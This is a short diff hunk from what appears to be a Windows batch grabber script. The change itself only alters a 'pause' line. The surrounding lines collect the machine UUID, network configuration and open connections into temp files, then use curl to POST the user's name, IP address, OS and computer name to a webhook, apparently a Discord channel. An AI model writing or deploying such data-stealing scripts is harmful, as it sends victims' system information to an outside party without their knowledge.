@@ -14,7 +14,7 @@ wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
-pause 1>nul
+pause
 
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
